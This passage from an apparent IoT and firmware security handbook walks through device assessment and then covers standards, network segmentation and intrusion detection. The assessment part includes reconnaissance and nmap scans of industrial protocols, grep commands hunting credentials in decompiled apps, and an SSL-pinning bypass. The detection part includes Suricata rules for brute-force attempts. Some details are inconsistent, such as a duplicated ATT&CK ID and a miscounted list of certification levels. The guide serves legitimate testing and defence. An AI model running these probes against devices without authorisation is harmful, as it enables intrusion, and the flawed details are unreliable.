### 8.2 FCC ID Lookup Workflow

```
1. Find FCC ID on device label (format: XXXXXXXXXXX)
   Example: 2APMF-VHT21 (TP-Link Deco M5)

2. Search at: https://fccid.io/ or https://apps.fcc.gov/oetcf/eas/reports/

3. Download from FCC database:
   - Internal/External Photos: PCB photos showing components, test points
   - Test Report: RF specifications, frequency bands
   - User Manual: Sometimes reveals default credentials, debug modes
   - Confidentiality Letter: Shows what was kept confidential (and why)

4. PCB Analysis from FCC Photos:
   - Identify SoC/MCU part numbers
   - Locate UART/JTAG headers (sometimes circled for test points)
   - Identify flash chip part numbers
   - Note RF modules and antenna connections

5. Cross-reference:
   - SoC datasheet → memory map, boot ROM location
   - Flash datasheet → programming interface, read protection
```

### 8.3 Full IoT Assessment Process

```
Phase 1: Passive Reconnaissance
├── FCC ID lookup → PCB photos, RF capabilities
├── Shodan/Censys → exposed services, banners
├── CVE/NVD search → known vulnerabilities for device model
├── GitHub/forums search → researcher POCs, leaked firmware
└── Vendor website → firmware download, changelogs

Phase 2: Physical Assessment
├── PCB photography (high-res, both sides)
├── Component identification (SoC, flash, RAM, wireless)
├── UART pin identification and baud rate detection
├── JTAG/SWD pin identification
└── External port enumeration (USB, SD, console)

Phase 3: Firmware Extraction
├── Download from vendor (if available)
├── UART/U-Boot extraction
├── SPI flash dump (in-circuit or chip-off)
└── JTAG memory dump

Phase 4: Firmware Analysis (binwalk)
├── binwalk -BAeM firmware.bin (signature + arch + extract)
├── binwalk -E firmware.bin (entropy analysis)
├── Filesystem type identification (squashfs, jffs2, cramfs)
└── Version strings, build timestamps

Phase 5: Filesystem Enumeration
├── /etc/passwd, /etc/shadow (credentials)
├── /etc/config/ (router config files)
├── init scripts (startup services)
├── Web root (/www/, /htdocs/) — CGI scripts
├── SUID/SGID binaries
└── Crypto material (certs, keys)

Phase 6: Web Interface Testing
├── Authentication testing (default creds, bypass)
├── Input validation (SQLi, command injection, XSS)
├── CSRF protection
├── Sensitive data in responses
├── API endpoint discovery
└── Session management

Phase 7: Network Service Enumeration
├── nmap -sV -sC -p- [device_ip]
├── Protocol-specific testing (MQTT, CoAP, Modbus, UPnP)
├── SNMP enumeration
└── Service version → known CVEs

Phase 8: API Testing
├── REST API discovery (/api/v1/, /cgi-bin/)
├── Authentication bypass
├── Broken object level authorization
├── Mass assignment / parameter pollution
└── Fuzzing endpoints with ffuf/Burp

Phase 9: OTA Update Analysis
├── Capture update traffic (Wireshark/mitmproxy)
├── Check TLS validation
├── Firmware signature verification
├── Downgrade attack possibility
└── MITM firmware replacement test

Phase 10: Reporting
├── Executive summary (risk level, business impact)
├── Technical findings (CVE-style writeups)
├── PoC code / reproduction steps
└── Remediation recommendations
```

### 8.4 Nmap Scripts for IoT

```bash
# UPnP enumeration
nmap --script upnp-info 192.168.1.0/24

# SNMP enumeration
nmap -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-netstat 192.168.1.0/24

# MQTT detection
nmap -p 1883,8883 --script mqtt-subscribe 192.168.1.0/24

# CoAP detection
nmap -sU -p 5683 --script coap-resources 192.168.1.0/24

# Modbus
nmap -p 502 --script modbus-discover 192.168.1.0/24

# BACnet (building automation)
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24

# DNP3 (power systems)
nmap -p 20000 --script dnp3-info 192.168.1.0/24

# EtherNet/IP (industrial)
nmap -p 44818 --script enip-info 192.168.1.0/24

# Siemens S7
nmap -p 102 --script s7-info 192.168.1.0/24

# Full IoT service scan
nmap -sV -p 23,80,443,502,1883,4840,5683,7547,8080,8443,44818     --script "banner,http-title,snmp-info,modbus-discover"     192.168.1.0/24
```

### 8.5 Mobile App Reverse Engineering for IoT Credentials

**Android APK Analysis:**
```bash
# Extract APK
adb shell pm list packages | grep -i vendor_name
adb shell pm path com.vendor.app
adb pull /data/app/com.vendor.app.apk

# Decompile with apktool
apktool d com.vendor.app.apk -o decompiled/

# Decompile to Java with jadx
jadx com.vendor.app.apk -d jadx_output/

# Search for credentials and endpoints
grep -rn "password\|secret\|apikey\|api_key\|token" jadx_output/ 2>/dev/null
grep -rn "http://\|https://\|ws://" jadx_output/smali/ 2>/dev/null

# Extract strings from binary libraries
find decompiled/lib/ -name "*.so" | xargs strings | grep -i "password\|secret\|key"

# Certificate pinning check
grep -rn "CertificatePinner\|TrustManager\|X509Certificate" jadx_output/ 2>/dev/null

# Dynamic analysis with Frida
frida -U -l ssl_bypass.js -f com.vendor.app --no-pause
# ssl_bypass.js: Universal SSL pinning bypass
```

---

## 9. IoT Security Standards

### 9.1 ETSI EN 303 645

ETSI EN 303 645 "Cyber Security for Consumer IoT" defines 13 baseline provisions:

| Provision | Requirement | Implementation |
|-----------|-------------|----------------|
| 5.1 | No universal default passwords | Unique per-device credentials or forced change |
| 5.2 | Implement means to manage vulnerability reports | Published vulnerability disclosure policy |
| 5.3 | Keep software updated | OTA update with signature verification |
| 5.4 | Securely store sensitive security parameters | HSM or secure element, no plaintext storage |
| 5.5 | Communicate securely | TLS 1.2+, certificate validation |
| 5.6 | Minimize exposed attack surfaces | Disable unused services, firewall by default |
| 5.7 | Ensure software integrity | Cryptographically verified updates |
| 5.8 | Ensure personal data is secure | Encryption at rest and in transit |
| 5.9 | Make systems resilient to outages | Graceful degradation, recovery mechanisms |
| 5.10 | Examine system telemetry data | Log security events, anomaly detection |
| 5.11 | Make it easy for users to delete data | GDPR-compliant data deletion |
| 5.12 | Make installation and maintenance easy | Security-by-default configuration |
| 5.13 | Validate input data | Input validation to prevent injection |

**ETSI EN 303 645 Compliance Assessment:**
```
Auditable evidence requirements:
- Provision 5.1: Firmware analysis shows no universal default passwords
- Provision 5.3: Update mechanism requires authenticated connections
- Provision 5.7: Signature verification code present and functional
- Provision 5.5: TLS configuration audit (cipher suites, cert validation)
```

### 9.2 NIST IR 8259 — IoT Device Cybersecurity Baseline

NIST IR 8259A defines the IoT device cybersecurity core baseline (6 capabilities):

| Capability | Description |
|-----------|-------------|
| Device Identification | Unique logical identifier, manufacturer info |
| Device Configuration | Ability to configure security settings |
| Data Protection | Cryptographic operations, key management |
| Logical Access Privileges | Role-based access, authentication mechanisms |
| Software Update | Authenticated, integrity-verified updates |
| Cybersecurity Event Logging | Security event log with timestamps |

**NIST IR 8259B** adds non-technical supporting capabilities (documentation, education, training).

**NIST IoT Cybersecurity Profile for Manufacturers:**
```
NISTIR 8259C: Creating a Profile Using NISTIR 8259A and 8259B
NISTIR 8259D: Profile for Federal Government IoT Devices

Key NIST SP 800-213 requirements for federal IoT:
- Asset inventory integration
- Network access control
- Encryption requirements
- Audit logging to centralized SIEM
```

### 9.3 ioXt Alliance

The ioXt Alliance "Pledge" certification program defines 8 security principles:

```
1. No universal passwords — factory-unique or user-set credentials
2. Protected interfaces — only necessary ports open
3. Proven cryptography — current standards, no custom crypto
4. Security by default — secure settings from factory
5. Signed and verified updates — cryptographic verification required
6. Automatically applied security updates — automatic patching capability
7. Vulnerability reporting program — published CVD policy
8. Security expiration date — published end-of-support date
```

**ioXt Certification Levels:**
- ioXt SmartHome: Consumer smart home devices
- ioXt Mobile Application: Companion apps
- ioXt VPN: Consumer/enterprise VPN products

### 9.4 UK Product Security and Telecommunications Infrastructure (PSTI) Act 2022

**Effective Date:** April 29, 2024

**Requirements for Consumer IoT Products in UK:**

```
1. Minimum security requirements (Schedule 1):
   a) Passwords: Must be unique per-device or user-set (no universal defaults)
   b) Vulnerability disclosure: Must publish a public policy with contact info
   c) Software updates: Must disclose minimum support period;
      must inform users when support ends

2. Compliance obligations:
   - Manufacturers: Ensure product meets requirements before market
   - Importers: Verify compliance, hold documentation
   - Distributors: Verify compliance, not knowingly supply non-compliant products

3. Enforcement:
   - Recall and prohibition notices
   - Civil penalties: up to £10 million or 4% of worldwide revenue
   - Criminal penalties for individuals (imprisonment possible)

4. Statement of Compliance: Required documentation proving requirements met
```

**PSTI Scope:**
- Internet-connectable products sold to UK consumers
- Products capable of connecting to other products (IoT hubs, smart home)
- Excludes: medical devices, smart meter infrastructure, desktop/laptop PCs

### 9.5 FCC IoT Labeling Program (Cyber Trust Mark)

**US FCC Voluntary IoT Labeling Program (2024):**

```
Program: US Cyber Trust Mark (shield logo)
Administrator: UL Solutions (authorized lab)
Effective: 2024 (voluntary, consumer IoT)

Requirements for certification:
1. No default or easily guessable passwords
2. Data encryption in transit and at rest
3. Regular security updates for defined period
4. Security patch management program
5. Consumer-facing vulnerability disclosure program
6. Published end-of-support date
7. Secure update mechanism (signed, verified)
8. Access controls (least privilege)

Device categories covered:
- Consumer routers
- Smart home devices (cameras, doorbells, locks)
- Smart appliances
- Fitness trackers, wearables
- Home energy management systems
```

### 9.6 PSA Certified (Arm)

**Platform Security Architecture (PSA) Certification:**

```
PSA Certified framework defines 4 certification levels:

Level 1: Self-certification questionnaire (26 security goals)
Level 2: Laboratory evaluation by independent lab
Level 3: Highest assurance with advanced attacks considered (penetration testing)

10 PSA Security Goals (from PSA Certified IoT Security Framework):
SG-01: Unique credentials per device
SG-02: Unique identity (certificate or key)
SG-03: Secure storage for assets
SG-04: Authenticated firmware update
SG-05: Anti-rollback protection
SG-06: Cryptographic isolation
SG-07: Runtime isolation (TrustZone)
SG-08: Secure boot
SG-09: Lifecycle management
SG-10: Debug interface control
```

### 9.7 IEC 62443 — Industrial Cybersecurity

IEC 62443 defines security requirements for Industrial Automation and Control Systems (IACS).

| Series | Title | Relevance |
|--------|-------|-----------|
| 62443-1-1 | Terminology and Concepts | Foundational definitions |
| 62443-2-1 | IACS Security Program Requirements | Asset owner requirements |
| 62443-2-4 | Service Provider Requirements | Integrator security requirements |
| 62443-3-3 | System Security Requirements | Technical security levels (SL1-4) |
| 62443-4-1 | Product Development Requirements | Secure SDL for device manufacturers |
| 62443-4-2 | Technical Requirements for IACS Components | Component-level requirements |

**Security Levels (SL):**
```
SL 1: Protection against casual/unintentional violation
SL 2: Protection against intentional violation using simple means
SL 3: Protection against sophisticated attack with IACS knowledge
SL 4: Protection against nation-state level sophisticated attack

Foundational Requirements (FR) mapped to Security Levels:
FR 1: Identification and Authentication Control
FR 2: Use Control
FR 3: System Integrity
FR 4: Data Confidentiality
FR 5: Restricted Data Flow
FR 6: Timely Response to Events
FR 7: Resource Availability
```

---

## 10. Defensive IoT Security

### 10.1 Network Segmentation

**IoT VLAN Architecture:**
```
Architecture principle: Zero trust for IoT — no lateral movement possible

Recommended VLAN design:
VLAN 1:   Corporate LAN (workstations, servers) — management network
VLAN 10:  Server DMZ (internet-facing servers)
VLAN 20:  IoT VLAN (all IoT devices — no internet direct access)
VLAN 30:  OT/SCADA VLAN (industrial devices — air-gapped from IT)
VLAN 100: Guest WiFi (isolated, internet only)
VLAN 200: Security cameras (isolated, NVR access only)

Firewall rules for IoT VLAN:
- IoT → Internet: DENY (proxy via content filter only)
- IoT → Corporate: DENY
- IoT → IoT: DENY (no lateral movement between devices)
- IoT → DNS Server: ALLOW (specific DNS server only)
- IoT → NTP Server: ALLOW (specific NTP only)
- Corporate → IoT Management: ALLOW (admin hosts only, specific ports)
- IoT → Cloud Service: ALLOW (specific IP/domain whitelist)
```

**Cisco IOS VLAN/ACL Configuration:**
```
! Create IoT VLAN
vlan 20
 name IoT_DEVICES

! IoT interface
interface GigabitEthernet0/1
 switchport mode access
 switchport access vlan 20
 spanning-tree portfast
 storm-control broadcast level 10

! IoT ACL - deny lateral movement
ip access-list extended IoT_ACL
 permit udp any host 192.168.1.53 eq 53    ! DNS
 permit udp any host 192.168.1.123 eq 123  ! NTP
 deny   ip 192.168.20.0 0.0.0.255 192.168.1.0 0.0.0.255
 deny   ip 192.168.20.0 0.0.0.255 192.168.10.0 0.0.0.255
 permit ip 192.168.20.0 0.0.0.255 any

! Apply to VLAN interface
interface Vlan20
 ip address 192.168.20.1 255.255.255.0
 ip access-group IoT_ACL in
```

**pfSense/OPNsense IoT Rules:**
```
Interface: IoT_VLAN (192.168.20.0/24)

Rules (top to bottom):
1. ALLOW TCP/UDP from IoT_NET to THIS_FW:53 (DNS)
2. ALLOW UDP from IoT_NET to THIS_FW:67 (DHCP)
3. ALLOW UDP from IoT_NET to NTP_SERVER:123
4. BLOCK IoT_NET to RFC1918 (no access to private networks)
5. BLOCK IoT_NET to IoT_NET (no lateral movement)
6. ALLOW IoT_NET to ANY (internet via NAT)
```

### 10.2 IoT Asset Inventory

**Passive Discovery Platforms:**

**Armis (agentless, passive):**
```
- Monitors network traffic passively (SPAN port or network tap)
- Device fingerprinting via traffic patterns, protocols, DHCP, OUI
- Coverage: IT, IoT, OT, medical devices
- Vulnerability correlation: maps CVEs to discovered devices
- Integration: ServiceNow, Splunk, Palo Alto Cortex
```

**Claroty (OT/IoT specialist):**
```
- Deep packet inspection of OT protocols (Modbus, PROFINET, EtherNet/IP)
- Network baseline + anomaly detection
- Purdue model network segmentation assessment
- Incident response workflows
- CVE tracking per asset
```

**Forescout Platform:**
```
- Agentless device discovery and classification
- Integration with NAC (802.1X enforcement)
- CounterACT policy engine: auto-quarantine rogue devices
- Device Cloud: 13+ million device fingerprints
- Integration: Cisco ISE, Aruba ClearPass
```

**Open Source Alternative — Nmap + Custom Fingerprinting:**
```bash
# Regular automated inventory scan
nmap -sn -T4 192.168.20.0/24 -oX iot_scan_$(date +%Y%m%d).xml

# OS/service detection for new devices
nmap -sV -O --script banner,upnp-info 192.168.20.0/24 -oN services.txt

# Compare scans for new devices
ndiff scan_yesterday.xml scan_today.xml

# DHCP lease monitoring
grep "DHCPACK" /var/log/dhcp.log | awk '{print $12, $7}' | sort | uniq
```

### 10.3 Firmware Update Policy

**Key Policy Elements:**
```
1. Asset Inventory Integration
   - All IoT devices registered in CMDB
   - Vendor, model, firmware version tracked
   - EOL/EOS dates from vendor advisory tracked

2. Vulnerability Monitoring
   - Subscribe to vendor security advisories (email/RSS)
   - Monitor NVD/CISA Known Exploited Vulnerabilities (KEV) list
   - Correlate CVEs to inventory: if CVE affects registered device → alert

3. Update SLAs:
   - Critical (CVSS 9.0+, known exploitation): Patch within 24-72 hours
   - High (CVSS 7.0-8.9): Patch within 30 days
   - Medium (CVSS 4.0-6.9): Patch within 90 days
   - Low: Patch at next maintenance window

4. EOL Device Policy:
   - 6 months before EOL: Begin replacement procurement
   - At EOL: Move to isolated VLAN with strict ACLs
   - Post-EOL: No new CVSS 4.0+ allowed without compensating controls
   - Document exceptions with CISO approval

5. Update Testing:
   - Non-critical updates: Test on lab device first
   - Critical updates: Emergency deployment with rollback plan
   - Staged rollout: 5% → 25% → 100%
```

### 10.4 Microsoft Defender for IoT

**Architecture:**
```
Sensor deployment options:
1. Network sensor (OT): Agentless, SPAN port or network tap
2. Micro-agent: Agent installed on Linux/RTOS devices
3. Cloud-connected vs locally managed sensor modes

Integration: Azure Sentinel SIEM, Microsoft 365 Defender

Detection capabilities:
- Protocol anomaly detection (Modbus, DNP3, IEC 60870-5, PROFINET)
- Known attack signatures (ICS-specific threat intelligence)
- Zero-day behavioral detection via ML models
- Asset discovery and inventory (auto-populated)
```

**Deployment:**
```bash
# Install Defender for IoT OT sensor (Ubuntu 18.04 LTS)
# 1. Download installation ISO from Azure portal
# 2. Configure SPAN port on managed switch
# 3. Connect sensor to SPAN port + management network
# 4. Run wizard: sudo defender-iot-micro-agent install

# Azure CLI onboarding
az iot defender sensor create     --name "factory-floor-sensor"     --resource-group IoT-Security-RG     --site-id "factory-site-001"     --sensor-type "OT"
```

### 10.5 SBOM Requirements for IoT

**Software Bill of Materials (SBOM) — IoT Context:**

```
SBOM formats:
- SPDX (Software Package Data Exchange) — Linux Foundation standard
- CycloneDX — OWASP project, XML/JSON
- SWID (Software Identification Tags) — ISO/IEC 19770-2

SBOM minimum elements (NTIA Consensus):
1. Supplier Name
2. Component Name
3. Version of Component
4. Other Unique Identifiers (CPE, PURL)
5. Dependency Relationships
6. Author of SBOM data
7. Timestamp

IoT SBOM generation from firmware:
```

```bash
# Extract firmware with binwalk
binwalk -e firmware.bin -C /tmp/firmware_extract/

# Generate SBOM with Syft
syft dir:/tmp/firmware_extract/ -o spdx-json=sbom.spdx.json
syft dir:/tmp/firmware_extract/ -o cyclonedx-json=sbom.cyclonedx.json

# Or from container image
syft ghcr.io/iot-vendor/device-firmware:1.2.3

# Scan SBOM for vulnerabilities
grype sbom:./sbom.spdx.json

# OSV Scanner (Google)
osv-scanner --sbom sbom.cyclonedx.json
```

**Regulatory Requirements:**
```
- US Executive Order 14028 (May 2021): Federal agencies must obtain SBOM
- FDA (medical devices): SBOM required for cybersecurity submissions (Oct 2023)
- EU Cyber Resilience Act (2024): SBOM mandated for CE-marked products
- NTIA Minimum Elements guidance: de facto standard globally
```

### 10.6 Zeek/Suricata IoT Anomaly Detection

**Zeek IoT Protocol Detection:**
```zeek
# /opt/zeek/share/zeek/site/iot-monitor.zeek

# MQTT protocol analysis
@load protocols/mqtt

event mqtt_subscribe(c: connection, msg_id: count, topics: MQTT::Topic_Vector, qos_levels: vector of count, retain: bool)
    {
    print fmt("[MQTT] Subscription from %s: topics=%s", c$id$orig_h, topics);
    # Alert on wildcard subscriptions (potential scanning)
    for (i in topics) {
        if (topics[i]$topic_filter == "#" || topics[i]$topic_filter == "+") {
            print fmt("[ALERT] Wildcard MQTT subscription from %s", c$id$orig_h);
        }
    }
    }

# Modbus TCP monitoring
event modbus_read_coils_request(c: connection, headers: ModbusHeaders, start_address: count, quantity: count)
    {
    if (quantity > 100) {
        print fmt("[ALERT] Suspicious Modbus bulk coil read from %s: qty=%d", c$id$orig_h, quantity);
    }
    }

# Detect new IoT devices (DHCP fingerprinting)
event dhcp_message(c: connection, is_orig: bool, msg: DHCP::Msg, options: DHCP::Options)
    {
    if (msg$op == 1 && options?$vendor_class) {
        print fmt("[DHCP] New device: MAC=%s, vendor=%s, IP=%s",
            msg$chaddr, options$vendor_class, msg$ciaddr);
    }
    }
```

**Suricata IoT Rules:**
```yaml
# /etc/suricata/rules/iot.rules

# Detect unauthenticated MQTT connections (no username in CONNECT)
alert tcp any any -> any 1883 (msg:"IOT MQTT CONNECT without credentials";
    flow:established,to_server;
    content:"|10|"; offset:0; depth:1;
    content:!"|00 04|user"; distance:0; within:200;
    sid:9000001; rev:1;)

# Detect MQTT wildcard subscription
alert tcp any any -> any 1883 (msg:"IOT MQTT Wildcard Subscription";
    flow:established,to_server;
    content:"|82|"; offset:0; depth:1;
    content:"#"; distance:0; within:100;
    sid:9000002; rev:1;)

# Modbus write to coils (potential equipment manipulation)
alert tcp any any -> any 502 (msg:"IOT Modbus Write Coil";
    flow:established,to_server;
    content:"|00 05|"; offset:6; depth:2;
    sid:9000003; rev:1;)

# Detect Mirai-style Telnet brute force
alert tcp any any -> any 23 (msg:"IOT Telnet Brute Force Attempt";
    flow:established,to_server;
    content:"admin"; nocase;
    threshold: type both, track by_src, count 10, seconds 60;
    sid:9000004; rev:1;)

# CoAP amplification probe
alert udp any any -> any 5683 (msg:"IOT CoAP Multicast Probe";
    dst_ip: 224.0.1.187;
    content:".well-known";
    sid:9000005; rev:1;)
```

### 10.7 MITRE ATT&CK for ICS Mapping Table

ATT&CK for ICS covers tactics and techniques specific to Industrial Control Systems. The T0800 range covers ICS-specific techniques.

**Tactic-Technique Mapping (Key T0800-T0900 Range):**

| Tactic | Technique ID | Technique Name | IoT/ICS Context |
|--------|-------------|----------------|-----------------|
| Initial Access | T0819 | Exploit Public-Facing Application | HMI/SCADA web interfaces |
| Initial Access | T0866 | Exploitation of Remote Services | RDP, VPN, OT protocols |
| Initial Access | T0862 | Supply Chain Compromise | Compromised firmware/components |
| Execution | T0807 | Command-Line Interface | Linux shell via UART/SSH |
| Execution | T0821 | Modify Controller Tasking | Direct PLC program modification |
| Execution | T0871 | Execution through API | SCADA/DCS API abuse |
| Persistence | T0839 | Module Firmware | Malicious firmware in PLC modules |
| Persistence | T0857 | System Firmware | Router/device firmware backdoor |
| Persistence | T0859 | Valid Accounts | Use of stolen credentials |
| Evasion | T0849 | Masquerading | Legitimate-looking process names |
| Evasion | T0872 | Indicator Removal on Host | Log clearing |
| Discovery | T0840 | Network Connection Enumeration | OT network mapping |
| Discovery | T0842 | Network Sniffing | Capture ICS protocol traffic |
| Discovery | T0888 | Remote System Information Discovery | Enumerate SCADA/HMI hosts |
| Lateral Movement | T0812 | Default Credentials | Cross-device lateral movement |
| Lateral Movement | T0866 | Lateral Tool Transfer | Move tools between OT systems |
| Collection | T0801 | Monitor Process State | Read PLC register values |
| Collection | T0845 | Program Upload | Extract PLC ladder logic |
| C2 | T0885 | Commonly Used Port | C2 over Modbus/DNP3 |
| C2 | T0884 | Connection Proxy | Pivot through IoT devices |
| Inhibit Response | T0800 | Activate Firmware Update Mode | Force insecure update state |
| Inhibit Response | T0803 | Block Command Message | Prevent safety commands |
| Inhibit Response | T0804 | Block Reporting Message | Suppress alarms |
| Impact | T0813 | Denial of Control | Prevent operator control |
| Impact | T0826 | Loss of Availability | System shutdown/DoS |
| Impact | T0831 | Manipulation of Control | Alter process values |
| Impact | T0879 | Damage to Property | Cause physical damage (cf. Stuxnet) |

**Stuxnet ATT&CK Mapping Reference:**
```
T0862: Supply chain via infected USB drives
T0857: Modified Siemens S7-315 firmware
T0831: Manipulation of centrifuge speed (manipulation of control)
T0879: Physical damage to uranium centrifuges
T0884: Used legitimate Siemens STEP 7 software for persistence
```

---

## Quick Reference: Tools and Resources

### Essential Firmware/IoT Security Tools

| Category | Tool | URL/Package |
|----------|------|-------------|
| Firmware extraction | binwalk | `pip install binwalk` |
| Flash programmer | flashrom | `apt install flashrom` |
| UART terminal | minicom, picocom | `apt install minicom` |
| JTAG debug | OpenOCD | `apt install openocd` |
| Hardware security | ChipWhisperer | `pip install chipwhisperer` |
| Firmware emulation | FAT/Firmadyne | GitHub: attify/firmware-analysis-toolkit |
| UEFI analysis | efiXplorer | GitHub: binarly-io/efiXplorer |
| UEFI security | CHIPSEC | `pip install chipsec` |
| Zigbee testing | KillerBee | `pip install killerbee` |
| MQTT testing | mosquitto-clients | `apt install mosquitto-clients` |
| Industrial protocols | pymodbus | `pip install pymodbus` |
| Network mapping | Shodan CLI | `pip install shodan` |
| Vuln scanner | routersploit | GitHub: threat9/routersploit |
| IoT intrusion detection | Zeek | `apt install zeek` |
| SBOM generation | Syft | GitHub: anchore/syft |
| SBOM vuln scan | Grype | GitHub: anchore/grype |
| Reverse engineering | Ghidra | ghidra-sre.org |

### Key CVE Reference List

| CVE | Device Type | CVSS | Type |
|-----|-------------|------|------|
| CVE-2023-24932 | Windows bootloader | 6.7 | Secure Boot bypass (BlackLotus) |
| CVE-2020-10713 | GRUB2 (all Linux) | 8.2 | Buffer overflow (BootHole) |
| CVE-2021-36260 | Hikvision cameras | 9.8 | Command injection |
| CVE-2021-44228 | Log4j (IoT Java apps) | 10.0 | RCE (Log4Shell) |
| CVE-2019-12255 | VxWorks RTOS | 9.8 | Heap overflow (URGENT/11) |
| CVE-2018-14847 | MikroTik RouterOS | 9.1 | Credential extraction |
| CVE-2017-13077 | WPA2 (all devices) | 8.1 | Key reinstall (KRACK) |
| CVE-2019-9506 | Bluetooth (all) | 8.1 | KNOB key negotiation |
| CVE-2014-9222 | TR-069 (ISP routers) | 10.0 | Misfortune Cookie |
| CVE-2016-10174 | Netgear routers | 9.8 | Command injection |

---

*Last updated: 2026-04-26 | Framework versions: OWASP IoT Top 10 (2018), ATT&CK for ICS v14, ETSI EN 303 645 v2.1.1, NIST IR 8259A*
